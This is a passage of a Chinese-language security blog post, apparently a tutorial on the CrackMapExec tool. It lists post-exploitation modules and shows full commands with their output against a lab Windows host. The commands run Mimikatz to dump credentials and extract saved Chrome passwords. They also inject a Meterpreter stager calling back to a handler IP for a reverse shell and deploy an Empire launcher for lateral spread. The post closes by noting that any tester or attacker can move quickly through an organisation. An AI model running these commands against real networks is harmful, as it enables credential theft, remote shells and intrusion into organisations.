+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec -L</span><br><span class="line">[*] empire_exec          Uses Empire<span class="string">&#x27;s RESTful API to generate a launcher for the specified listener and executes it</span></span><br><span class="line"><span class="string">[*] shellinject          Downloads the specified raw shellcode and injects it into memory using PowerSploit&#x27;</span>s Invoke-Shellcode.ps1 script</span><br><span class="line">[*] rundll32_exec        Executes a <span class="built_in">command</span> using rundll32 and Windows<span class="string">&#x27;s native javascript interpreter</span></span><br><span class="line"><span class="string">[*] com_exec             Executes a command using a COM scriptlet to bypass whitelisting</span></span><br><span class="line"><span class="string">[*] tokenrider           Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials</span></span><br><span class="line"><span class="string">[*] mimikatz             Executes PowerSploit&#x27;</span>s Invoke-Mimikatz.ps1 script</span><br><span class="line">[*] tokens               Enumerates available tokens using Powersploit<span class="string">&#x27;s Invoke-TokenManipulation</span></span><br><span class="line"><span class="string">[*] peinject             Downloads the specified DLL/EXE and injects it into memory using PowerSploit&#x27;</span>s Invoke-ReflectivePEInjection.ps1 script</span><br><span class="line">[*] powerview            Wrapper <span class="keyword">for</span> PowerView<span class="string">&#x27;s functions</span></span><br><span class="line"><span class="string">[*] mimikittenz          Executes Mimikittenz</span></span><br><span class="line"><span class="string">[*] enum_chrome          Uses Powersploit&#x27;</span>s Invoke-Mimikatz.ps1 script to decrypt saved Chrome passwords</span><br><span class="line">[*] metinject            Downloads the Meterpreter stager and injects it into memory using PowerSploit<span class="string">&#x27;s Invoke-Shellcode.ps1 script</span></span><br><span class="line"><span class="string">[*] eventvwr_bypass      Executes a command using the eventvwr.exe fileless UAC bypass</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用一个模块"><a href="#使用一个模块" class="headerlink" title="使用一个模块"></a>使用一个模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Run cme &lt;protocol&gt; &lt;target(s)&gt; -M &lt;module name&gt;.</span><br></pre></td></tr></table></figure>
+
+<p>例如，运行SMB Mimikatz模块:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme &lt;protocol&gt; -M &lt;module name&gt; --options to view a modules supported options, e.g:</span><br><span class="line">cme smb -M mimikatz --options</span><br></pre></td></tr></table></figure>
+
+<p>使用模块选项</p>
+<p>模块选项用-o标志指定。所有选项都以KEY&#x3D;value的形式指定(msfvenom风格)</p>
+<p>例子:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme &lt;protocol&gt; &lt;target(s)&gt; -u Administrator -p <span class="string">&#x27;P@ssw0rd&#x27;</span> -M mimikatz -o COMMAND=<span class="string">&#x27;privilege::debug&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="模块-MimiKatz"><a href="#模块-MimiKatz" class="headerlink" title="模块 - MimiKatz"></a>模块 - MimiKatz</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo cme 192.168.215.104 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;PASS&#x27;</span> --local-auth -M mimikatz</span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)</span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASS (Pwn3d!)</span><br><span class="line">MIMIKATZ     192.168.215.104:445 MEETINGROOM     [+] Executed payload</span><br><span class="line">MIMIKATZ                                       [*] Waiting on 1 host(s)</span><br><span class="line">MIMIKATZ     192.168.215.104                   [*] - - <span class="string">&quot;GET /Invoke-Mimikatz.ps1 HTTP/1.1&quot;</span> 200 -</span><br><span class="line">MIMIKATZ                                       [*] Waiting on 1 host(s)</span><br><span class="line">MIMIKATZ     192.168.215.104                   [*] - - <span class="string">&quot;POST / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">MIMIKATZ     192.168.215.104                   [+] Found credentials <span class="keyword">in</span> Mimikatz output (domain\username:password)</span><br><span class="line">MIMIKATZ     192.168.215.104                   SE\Meeting:280778ddbb374ab9d2df719</span><br><span class="line">MIMIKATZ     192.168.215.104                   SE\MEETINGROOM$:0bfa8060fc6c6d42d6ea124</span><br><span class="line">MIMIKATZ     192.168.215.104                   SE\MEETINGROOM$:b245712b92126c953f203d6a</span><br><span class="line">MIMIKATZ     192.168.215.104                   [*] Saved Mimikatz<span class="string">&#x27;s output to Mimikatz-192.168.215.104-2018-01-02_144545.log</span></span><br><span class="line"><span class="string">[*] KTHXBYE!</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme6.png"></li>
+</ul>
+<h2 id="模块-Enum-Chrome"><a href="#模块-Enum-Chrome" class="headerlink" title="模块 - Enum_Chrome"></a>模块 - Enum_Chrome</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cme 192.168.215.104 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;PASS&#x27;</span> --local-auth -M enum_chrome</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用CrackMapExec来get-shell"><a href="#使用CrackMapExec来get-shell" class="headerlink" title="使用CrackMapExec来get shell"></a>使用CrackMapExec来get shell</h2><h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p>Metasploit Module - Metinject</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme -M metinject --show-options</span><br><span class="line">[*] metinject module options:</span><br><span class="line"></span><br><span class="line">        LHOST      IP hosting the handler</span><br><span class="line">        LPORT      Handler port</span><br><span class="line">        PAYLOAD    Payload to inject: reverse_http or reverse_https (default: reverse_https)</span><br><span class="line">        PROCID     Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure>
+
+<p>SMB to Meterpreter shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo cme 192.168.215.104 -u <span class="string">&#x27;Administrator&#x27;</span> -p <span class="string">&#x27;PASS&#x27;</span> --local-auth -M met_inject -o LHOST=192.168.215.109 LPORT=5656 </span><br><span class="line">Password:</span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)</span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASS (Pwn3d!)</span><br><span class="line">METINJECT    192.168.215.104:445 MEETINGROOM     [+] Executed payload</span><br><span class="line">METINJECT                                      [*] Waiting on 1 host(s)</span><br><span class="line">METINJECT    192.168.215.104                   [*] - - <span class="string">&quot;GET /Invoke-Shellcode.ps1 HTTP/1.1&quot;</span> 200 -</span><br><span class="line">[*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme7.png"></li>
+</ul>
+<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>启动RESTful API</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">empire --rest --user empireadmin --pass gH25Iv1K68@^</span><br><span class="line"></span><br><span class="line">[*] Loading modules from: /usr/local/Cellar/empire/1.5_1/libexec/lib/modules/</span><br><span class="line"> * Starting Empire RESTful API on port: 1337</span><br><span class="line"> * RESTful API token: 3brqi3nypvjzqgd269km091onaqc1t6kz8l1fclk</span><br><span class="line"> * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
+
+<p>启动 empire listener to target</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo cme 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest</span><br><span class="line">EMPIRE_EXEC                                    [+] Successfully generated launcher <span class="keyword">for</span> listener <span class="string">&#x27;CMETest&#x27;</span></span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [*] Windows 6.3 Build 9600 (name:MEETINGROOM) (domain:SE)</span><br><span class="line">CME          192.168.215.104:445 MEETINGROOM     [+] MEETINGROOM\Administrator:PASSWORD (Pwn3d!)</span><br><span class="line">EMPIRE_EXEC  192.168.215.104:445 MEETINGROOM     [+] Executed Empire Launcher</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme8.png"></li>
+</ul>
+<h2 id="Empire-amp-DeathStar-联动"><a href="#Empire-amp-DeathStar-联动" class="headerlink" title="Empire &amp; DeathStar 联动"></a>Empire &amp; DeathStar 联动</h2><p>CrackMapExec可以在被入侵的机器上部署empire代理。这使得进一步的后开发活动更加容易，特别是如果使用DeathStar的自动攻击能力。通过使用empire_exec模块并指定您希望代理使用的侦听器，这将部署和激活代理。所有收集到的凭据都可以导入到CrackMapExec凭据数据库中。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/cme9.png"></li>
+</ul>
+<p>有了所有这些功能，CrackMapExec可以使任何测试者或攻击者很容易获得一台被入侵的计算机，并通过几个基本命令迅速在组织中传播。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/12/14/crackmapexec/" title="crackmapexec终极指南">https://fdlucifer.github.io/2020/12/14/crackmapexec/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/crackmapexec/" rel="tag"><i class="fa fa-tag"></i> crackmapexec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/14/linux-clean/" rel="prev" title="几条命令彻底清理kali-linux多余垃圾文件">
+                  <i class="fa fa-chevron-left"></i> 几条命令彻底清理kali-linux多余垃圾文件
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/16/ready/" rel="next" title="Hack-The-Box-walkthrough[ready]">
+                  Hack-The-Box-walkthrough[ready] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
